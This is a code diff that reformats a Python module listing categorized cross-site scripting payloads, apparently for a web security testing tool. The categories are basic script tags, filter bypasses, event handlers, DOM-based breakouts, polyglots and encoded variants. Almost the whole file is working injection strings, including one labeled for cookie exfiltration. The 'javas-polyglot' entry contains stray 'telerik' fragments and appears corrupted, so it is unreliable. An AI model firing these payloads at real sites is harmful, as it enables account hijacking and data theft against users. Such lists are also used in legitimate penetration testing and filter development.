@@ -42,10 +42,21 @@ def get_payload_categories() -> dict[str, PayloadCategory]:
     basic = PayloadCategory("basic", "Standard XSS payloads for initial testing")
     basic.payloads = [
         Payload("alert-script", '<script>alert("XSS")</script>', "Classic script tag injection"),
-        Payload("alert-number", "<script>alert(1)</script>", "Numeric alert (avoids string filters)"),
-        Payload("alert-document", "<script>alert(document.domain)</script>", "Shows current domain"),
+        Payload(
+            "alert-number", "<script>alert(1)</script>",
+            "Numeric alert (avoids string filters)",
+        ),
+        Payload(
+            "alert-document",
+            "<script>alert(document.domain)</script>",
+            "Shows current domain",
+        ),
         Payload("alert-cookie", "<script>alert(document.cookie)</script>", "Exfiltrate cookies"),
-        Payload("img-onerror", '<img src=x onerror=alert("XSS")>', "Event handler via broken image"),
+        Payload(
+            "img-onerror",
+            '<img src=x onerror=alert("XSS")>',
+            "Event handler via broken image",
+        ),
         Payload("svg-onload", '<svg onload=alert("XSS")>', "SVG element with onload"),
         Payload("body-onload", '<body onload=alert("XSS")>', "Body onload event"),
         Payload("input-onfocus", '<input autofocus onfocus=alert("XSS")>', "Auto-focusing input"),
@@ -57,18 +68,41 @@ def get_payload_categories() -> dict[str, PayloadCategory]:
     # Filter bypass
     bypass = PayloadCategory("filter-bypass", "Payloads that bypass common XSS filters")
     bypass.payloads = [
-        Payload("case-variation", '<ScRiPt>alert("XSS")</ScRiPt>', "Mixed case to bypass case-sensitive filters"),
+        Payload(
+            "case-variation",
+            '<ScRiPt>alert("XSS")</ScRiPt>',
+            "Mixed case to bypass case-sensitive filters",
+        ),
         Payload("null-byte", '<scr\x00ipt>alert("XSS")</script>', "Null byte insertion"),
-        Payload("double-encoding", "%253Cscript%253Ealert(1)%253C/script%253E", "Double URL encoding"),
-        Payload("html-entities", "&#60;script&#62;alert(1)&#60;/script&#62;", "HTML entity encoding"),
+        Payload(
+            "double-encoding",
+            "%253Cscript%253Ealert(1)%253C/script%253E",
+            "Double URL encoding",
+        ),
+        Payload(
+            "html-entities",
+            "&#60;script&#62;alert(1)&#60;/script&#62;",
+            "HTML entity encoding",
+        ),
         Payload("unicode-escape", "<script>\\u0061lert(1)</script>", "Unicode escape in JS"),
         Payload("no-quotes", "<img src=x onerror=alert(1)>", "No quotes needed"),
         Payload("backtick-template", "<script>alert(`XSS`)</script>", "Template literal backticks"),
-        Payload("eval-fromcharcode", "<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>",
-                "Character code evaluation"),
-        Payload("svg-animate", '<svg><animate onbegin=alert(1) attributeName=x>', "SVG animate element"),
-        Payload("math-tag", '<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert(1)>',
-                "Math/table context switching"),
+        Payload(
+            "eval-fromcharcode",
+            "<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>",
+            "Character code evaluation",
+        ),
+        Payload(
+            "svg-animate",
+            '<svg><animate onbegin=alert(1) attributeName=x>',
+            "SVG animate element",
+        ),
+        Payload(
+            "math-tag",
+            '<math><mtext><table><mglyph><style><!--</style>'
+            '<img src=x onerror=alert(1)>',
+            "Math/table context switching",
+        ),
     ]
     categories["filter-bypass"] = bypass
 
@@ -80,36 +114,71 @@ def get_payload_categories() -> dict[str, PayloadCategory]:
         Payload("onerror-img", '<img src=x onerror=alert(1)>', "Image load error"),
         Payload("onload-svg", "<svg/onload=alert(1)>", "SVG load event (compact)"),
         Payload("onfocus-input", '<input onfocus=alert(1) autofocus>', "Auto-focus input"),
-        Payload("onblur-input", '<input onblur=alert(1) autofocus><input autofocus>', "Blur via double focus"),
-        Payload("onhashchange", '<body onhashchange=alert(1)><a href="#">click</a>', "URL hash change"),
-        Payload("onanimationend", '<style>@keyframes x{}</style><div style="animation-name:x" onanimationend=alert(1)>',
-                "CSS animation end event"),
+        Payload(
+            "onblur-input",
+            '<input onblur=alert(1) autofocus><input autofocus>',
+            "Blur via double focus",
+        ),
+        Payload(
+            "onhashchange",
+            '<body onhashchange=alert(1)><a href="#">click</a>',
+            "URL hash change",
+        ),
+        Payload(
+            "onanimationend",
+            '<style>@keyframes x{}</style>'
+            '<div style="animation-name:x" onanimationend=alert(1)>',
+            "CSS animation end event",
+        ),
         Payload("onresize", '<body onresize=alert(1)>', "Window resize (requires interaction)"),
-        Payload("onscroll", '<div onscroll=alert(1)><br><br>...<br><input autofocus>', "Scroll event"),
+        Payload(
+            "onscroll",
+            '<div onscroll=alert(1)><br><br>...<br><input autofocus>',
+            "Scroll event",
+        ),
     ]
     categories["event-handlers"] = events
 
     # DOM-based XSS
     dom = PayloadCategory("dom-based", "Payloads targeting DOM manipulation vulnerabilities")
     dom.payloads = [
-        Payload("location-hash", "#<script>alert(1)</script>", "Via location.hash (if reflected to DOM)"),
+        Payload(
+            "location-hash",
+            "#<script>alert(1)</script>",
+            "Via location.hash (if reflected to DOM)",
+        ),
         Payload("document-write", "';alert(1);//", "Break out of document.write context"),
         Payload("innerhtml", "<img src=x onerror=alert(1)>", "Injected via innerHTML"),
         Payload("eval-injection", "');alert(1);//", "Break out of eval() context"),
         Payload("settimeout", "alert(1)", "If passed to setTimeout/setInterval"),
-        Payload("postmessage", '<script>window.postMessage("<img src=x onerror=alert(1)>","*")</script>',
-                "Cross-origin message injection"),
+        Payload(
+            "postmessage",
+            '<script>window.postMessage("<img src=x onerror=alert(1)>","*")</script>',
+            "Cross-origin message injection",
+        ),
         Payload("url-fragment", "javascript:alert(1)", "Via URL fragment if used in href"),
-        Payload("dom-clobbering", '<form id=x><input name=y value=alert(1)>', "DOM clobbering attack"),
+        Payload(
+            "dom-clobbering",
+            '<form id=x><input name=y value=alert(1)>',
+            "DOM clobbering attack",
+        ),
     ]
     categories["dom-based"] = dom
 
     # Polyglot payloads
-    polyglot = PayloadCategory("polyglot", "Multi-context payloads that work in various injection points")
+    polyglot = PayloadCategory(
+        "polyglot",
+        "Multi-context payloads that work in various injection points",
+    )
     polyglot.payloads = [
-        Payload("javas-polyglot",
-                "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%%0telerik%%0D0telerik%0A0telerik%0d%0a//</stYle/</titLe/</telerik</telerik/</sVg/</xSs/><sVg/oNloAd=alert()//>",
-                "Wide-coverage polyglot"),
+        Payload(
+            "javas-polyglot",
+            "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )"
+            "//%%0telerik%%0D0telerik%0A0telerik%0d%0a"
+            "//</stYle/</titLe/</telerik</telerik"
+            "/</sVg/</xSs/><sVg/oNloAd=alert()//>",
+            "Wide-coverage polyglot",
+        ),
         Payload("compact-polyglot",
                 "'\"><img src=x onerror=alert(1)>",
                 "Breaks out of attribute and tag contexts"),
@@ -128,12 +197,28 @@ def get_payload_categories() -> dict[str, PayloadCategory]:
     # Encoded payloads
     encoded = PayloadCategory("encoded", "Various encoded forms of XSS payloads")
     encoded.payloads = [
-        Payload("hex-encoded", "&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;", "Hex HTML entities"),
-        Payload("decimal-encoded", "&#60;script&#62;alert(1)&#60;/script&#62;", "Decimal HTML entities"),
+        Payload(
+            "hex-encoded",
+            "&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;",
+            "Hex HTML entities",
+        ),
+        Payload(
+            "decimal-encoded",
+            "&#60;script&#62;alert(1)&#60;/script&#62;",
+            "Decimal HTML entities",
+        ),
         Payload("url-encoded", "%3Cscript%3Ealert(1)%3C%2Fscript%3E", "URL encoded"),
-        Payload("base64-data-uri", '<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">click</a>',
-                "Base64 in data URI"),
-        Payload("javascript-uri", '<a href="javascript:alert(1)">click</a>', "JavaScript protocol in href"),
+        Payload(
+            "base64-data-uri",
+            '<a href="data:text/html;base64,'
+            'PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">click</a>',
+            "Base64 in data URI",
+        ),
+        Payload(
+            "javascript-uri",
+            '<a href="javascript:alert(1)">click</a>',
+            "JavaScript protocol in href",
+        ),
         Payload("unicode-full", "\u003Cscript\u003Ealert(1)\u003C/script\u003E", "Unicode escaped"),
     ]
     categories["encoded"] = encoded
